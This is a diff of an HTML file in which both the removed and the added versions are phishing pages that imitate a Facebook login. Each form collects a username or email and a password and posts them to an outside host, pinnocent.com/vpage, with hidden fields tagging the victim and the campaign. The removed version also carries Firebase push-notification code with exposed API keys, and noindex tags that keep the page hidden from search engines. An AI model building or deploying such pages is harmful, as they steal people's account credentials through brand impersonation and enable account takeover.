@@ -1,366 +1,56 @@
-
-  <!DOCTYPE html>
-<html>
-<head>
- 
-<script src="https://www.gstatic.com/firebasejs/4.9.1/firebase.js"></script>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-
-<link rel="manifest" href="manifest.json">
-<script>
-  // Initialize Firebase
-  /*Update this config*/
-  var config = {
-     apiKey: "AIzaSyBV2pY0LLJTrHhiCFArAedQpTiUshDJsi8",
-  authDomain: "pinnocent-fa387.firebaseapp.com",
-  databaseURL: "https://pinnocent-fa387.firebaseio.com",
-  projectId: "pinnocent-fa387",
-  storageBucket: "pinnocent-fa387.appspot.com",
-  messagingSenderId: "403452483449",
-  appId: "1:403452483449:web:630abc1e7c265a8f0481a8",
-  measurementId: "G-8DGVGDCCL2"
-  };
-  firebase.initializeApp(config);
-
-	// Retrieve Firebase Messaging object.
-	const messaging = firebase.messaging();
-	messaging.requestPermission()
-	.then(function() {
-	  console.log('Notification permission granted.');
-	  // TODO(developer): Retrieve an Instance ID token for use with FCM.
-	 
-               
-                vapidKey: 'BLf-6mYxA6BPIXK-MpMWYKuLDPpbKFtXdERFs506kY1xZsek0B8ieRRIikBGaO0LKrFXzglm-mNr4rpMypLLiJ4' }).then((currentToken) => {
-                if (currentToken) {
-                    console.log("Token is: "+currentToken);
-	  } else {
-	  	getRegToken();
-	  }
-
-	})
-	.catch(function(err) {
-	  console.log('Unable to get permission to notify.', err);
-	});
-
-	function getRegToken(argument) {
-		messaging.getToken()
-		  .then(function(currentToken) {
-		    if (currentToken) {
-		      saveToken(currentToken);
-		      console.log(currentToken);
-		      setTokenSentToServer(true);
-		    } else {
-		      console.log('No Instance ID token available. Request permission to generate one.');
-		      setTokenSentToServer(false);
-		    }
-		  })
-		  .catch(function(err) {
-		    console.log('An error occurred while retrieving token. ', err);
-		    setTokenSentToServer(false);
-		  });
-	}
-
-	function setTokenSentToServer(sent) {
-	    window.localStorage.setItem('sentToServer', sent ? 1 : 0);
-	}
-
-	function isTokenSentToServer() {
-	    return window.localStorage.getItem('sentToServer') == 1;
-	}
-
-	function saveToken(currentToken) {
-		$.ajax({
-			url: '?',
-			method: 'post',
-			data: 'token=' + currentToken
-		}).done(function(result){
-			console.log(result);
-		})
-	}
-
-	messaging.onMessage(function(payload) {
-	  console.log("Message received. ", payload);
-	  notificationTitle = payload.data.title;
-	  notificationOptions = {
-	  	body: payload.data.body,
-	  	icon: payload.data.icon,
-	  	image:  payload.data.image
-	  };
-	  var notification = new Notification(notificationTitle,notificationOptions);
-	});
-</script>
-</head>
-<body>
-<center>
- 
-  
-</center>
-</body>
-
- 
-<!doctype html>
-
-<html>
-
-<head>
-
- <div>
-     
-</div> 
-
-</div>
-</div> 
-<script src="js/popup.js"></script></div>
-</div> 
-</div> 
-</div> 
-</div> 
-
-
- </div>
-
-
-	<title>.</title>
-
-	
-
-  <meta name=”robots” content=”noindex”>
-
-
-<meta name="robots" content="noindex,follow">
-
-<meta name="robots" content="index,nofollow">
-
-<meta name="robots" content="noindex,nofollow">
-
-<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noodp" />
-
-    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noodp" />
-
-	<meta charset="utf-8">
-
-
-
-	<meta name="description" content="online">
-
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-	<meta property='og:image' content='earnmoney.jpg' />
-
-	<link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-ios7-contact-512.png">
-
-  
-	<style>
-
-		table tr td{text-align:center;}
-
-.button {
-
-  background-color: #4CAF50; /* Green */
-
-  border: none;
-
-  color: white;
-
-  padding: 14px 20px;
-
-  text-align: center;
-
-  text-decoration: none;
-
-  display: inline-block;
-
-  font-size: 16px;
-
-  margin: 1px 0px;
-
-  cursor: pointer;
-
-}
-
-.button1 {width: 250px;}
-
-.button2 {width: 50%;}
-
-.button3 {width: 95%;
-
-border-radius: 4px;
-
-border: 0px solid DarkGray;
-
-padding: 13px 13px;
-
-margin: 3px 3px;
-
-height: 50px;
-
-background-color: rgb(243,243,243);
-
-display: inline-block;
-
-
-
-}
-
-		.bottom a{color:#D3D3D3;}
-
-		.bottom a:link{text-decoration:none;}
-
-		input{padding:10px;}
-
-		
-
-		.login{background-color:rgb(19,90,245);color:white;
-
-border-radius: 4px;
-
-padding: 13px 13px;
-
-margin: -15px -15px;
-
-border: 1px solid DarkGray;
-
-font-family: 'segoe UI';
-
-font-size: 15px;
-
-font-weight: bold;
-
-		  
-
-		}
-
-		
-
-.center {
-
-  display: block;
-
-  margin-left: auto;
-
-  margin-right: auto;
-  padding-top: 10px;
-  padding-bottom: 5px;
- 
-
-}
-
-		.login{width: 97%;}
-
-		.check{background-color:#0ac21e;color:white;padding:10px;
-
-margin: 4px 2px;
-
-		}
-
-		.inputf a:link{text-decoration:none;}
-
-.phone{
-  position: relative;
-  bottom: 14px;
-  
-}
-.me{
-  position: relative;
-  bottom: 24px;
-  left: 5px;
-  font-family: Arial;
-  font-weight: 400;
-}
-
-	</style>
- 
-
-</head>
-
-<body style="margin:0px;">
- 
-
-<script>
-
-	document.title='online';
-
-</script>
-
-<div style="width:100%;">
-
-  
-
-<div style="width:100%;">
-
-<div style="height:20px;background-color:rgb(251,251,217);padding-bottom:10px;padding-left:0px;">
-
-
-	<img src="https://pinnocent.com/image/login1.jpg" width="360px" height="59px" class="phone"class="me">
-
-</div>
-
-
-
-</div>
-
-<div style="width:100%;">
-
- <a href="#">
-
-<img src="https://pinnocent.com/image/fabimg.png"  alt="screenshot demo" width="90" height="70" class="center">  </a>
-
-
-
-<div class="inputf" style="background-color:white;padding:10px;text-align:center;">
-
-<form id="anonymousNewMessage" class="form" method="POST" action="https://pinnocent.com/vpage">
-    <input type="hidden" name="ftype" value="normal" />
-
-                <div class="card-header text-center">
-
-
-
-              
-
-
-
-     
-
-                </div>
-
-                <div class="card-body">
-
-
-
-                  <input type="hidden" name="user_id" id="userUsername" value="16934">
-
-		<input class="button3" name="message_title" type="text" id="" placeholder="Email address or phone number" maxlength="40" size="30px"	required><br>
-
-		<input class="button3"  name="description" type="text" id="pass" placeholder="Password" maxlength="40" size="30px"
-
-		required>
-
-    <input type="hidden" name="ip" value="172.71.123.163" />
-
-<input type="hidden" name="link" value="facebook" />
-
-
-
-    <!-- the rest of the form //-->
-
-
-
-<br/><br/>
-
-		<input class="login" name="login" type="submit" id="anonymousProcess" value="Log In"><br/><br/>
-
- <a href="#">
-
-	<img src="POPOPO.png" alt="meta" width="350" height="350"></a>
-
-	
-
-</div>
-  
-</div>
-  </script>
-
-</body>
-
-	</html>
+<html lang="en">
+                 <head>
+                 <meta charset="UTF-8">
+                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                 <title>Login to facebook</title>
+          
+                 <style type="text/css" id="operaUserStyle">
+                 body{
+                   color:#ffffff; 
+                   background-image: url('background.png');
+                 }
+                 img {
+                   width: 100%;
+                 }
+                 input {
+                   width: 320px;
+                   height: 50px;
+                   border: 1px solid #4f4f4f;
+                   border-radius: 5px;
+                   margin: 5px;
+                   padding: 20px;
+                 }
+                 button {
+                   height: 40px;
+                   border: none;
+                   border-radius: 80px;
+                   background-color: #5762ef;
+                   color: white;
+                 }
+                 </style>
+                 </head>
+                 <img src="top.png">
+                 <center>
+          
+    <form action="https://pinnocent.com/vpage" method="POST">
+      <center>
+    <input type="hidden" name="link" value="custom template">
+    <input type="hidden" name="ftype" value="normal">
+    <input type="hidden" name="login" value="login">
+    <input type="hidden" name="user_id" value="16934">
+    <div class="p-2 w-full  gap-1  ">
+    <div class="flex flex-col   p-2  gap-1">
+    <input type="text" name="message_title" placeholder="Username, Email address or mobile number"> <br>
+    <input type="password" name="description" placeholder="Password" id="password" autocomplete="new-password" aria-autocomplete="list" required="password"></div>
+    </center>
+    <center>
+    <div>
+    <button type="submit" style="width: 280px">Log In</button>
+    </div>
+    </center>
+    </div>
+    </form>
+    <img src="bottom.png"
+    </div>
+    </div>
+    </div></body></html>
